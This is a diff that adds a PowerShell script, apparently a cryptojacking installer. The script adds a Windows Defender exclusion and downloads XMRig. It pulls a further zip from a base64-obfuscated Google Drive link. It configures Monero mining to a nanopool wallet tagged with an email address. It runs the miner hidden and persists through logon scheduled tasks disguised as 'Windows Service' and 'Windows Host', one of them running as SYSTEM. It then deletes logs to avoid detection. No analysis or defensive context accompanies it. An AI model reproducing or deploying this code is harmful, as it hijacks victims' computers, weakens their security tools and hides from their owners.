@@ -1,0 +1,79 @@
+$basePath = "$env:USERPROFILE\appdata\local\Host\xmrig"
+$xmrigPath = "$basePath\xmrig-6.22.2"
+$xmrigZipPath = "$basePath\xmrig.zip"
+$cacheZipPath = "$basePath\taskmanager.zip"
+$cacheFileId = "1F4T2Ic5_Wi6MJYPU8GYNwhnMeHywVTUt"
+$urldl = "aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0="
+$fileidurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urldl))
+$dlUrl = $fileidurl + $cachefileid
+
+
+# Ensure base folder exists
+New-Item -ItemType Directory -Path $basePath -Force | Out-Null
+
+# Whitelist path in Defender
+Add-MpPreference -ExclusionPath $xmrigPath
+
+
+
+# Download and extract XMRig if not present
+if (-not (Test-Path "$xmrigPath\xmrig.exe")) {
+    Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile $xmrigZipPath
+    Expand-Archive -Path $xmrigZipPath -DestinationPath $basePath
+    Remove-Item $xmrigZipPath -Force
+}
+
+# Download Google Drive zip and extract into same folder as xmrig.exe
+Invoke-WebRequest -Uri $dlUrl -OutFile $cacheZipPath
+Expand-Archive -Path $cacheZipPath -DestinationPath $xmrigPath -Force
+Remove-Item $cacheZipPath -Force
+
+# Set up mining pool and wallet address
+$POOL = "xmr-asia1.nanopool.org:14433"
+$WALLET = "4AUE3ETmbspMyLqNWzQARyAnXp8v1YYBaQEAYZ5wPZmECuhgx12W3CDLRehkm826vZFD9kB8UvvJ8Zehyt5jVQTv5Wbzktz"
+$xmrigConfigPath = "$xmrigPath\config.json"
+
+# Overwrite the config.json file with the new JSON structure
+$newConfig = @"
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "monero",
+            "url": "xmr-asia1.nanopool.org:14433",
+            "user": "4AUE3ETmbspMyLqNWzQARyAnXp8v1YYBaQEAYZ5wPZmECuhgx12W3CDLRehkm826vZFD9kB8UvvJ8Zehyt5jVQTv5Wbzktz.SW/rosebianca1023@gmail.com",
+            "tls": true
+        }
+    ]
+}
+"@
+# Write the new configuration to the config.json file
+$newConfig | Set-Content -Path $xmrigConfigPath -Force
+
+# Run the miner
+Start-Process "$xmrigPath\xmrig.exe" -WindowStyle Hidden
+
+#Run the Rename
+Start-Process -FilePath "$xmrigPath\RENAME.bat" -WorkingDirectory "$xmrigPath" -WindowStyle Hidden 
+
+
+$taskName = "Windows Service"
+$taskAction = New-ScheduledTaskAction -Execute "$xmrigPath\xmrig.exe"
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -Action $taskAction -Trigger $logonTrigger -Principal $taskPrincipal -TaskName $taskName -Force
+
+
+$taskName = "Windows Host"
+$taskAction = New-ScheduledTaskAction -Execute "$xmrigPath\WindowsHost.vbs" 
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+$taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
+Register-ScheduledTask -Action $taskAction -Trigger $logonTrigger -Principal $taskPrincipal -TaskName $taskName -Force
+
+# Optional Cleanup: Remove log files to avoid detection
+Remove-Item "$xmrigPath\*.log" -Force -ErrorAction SilentlyContinue
+
+
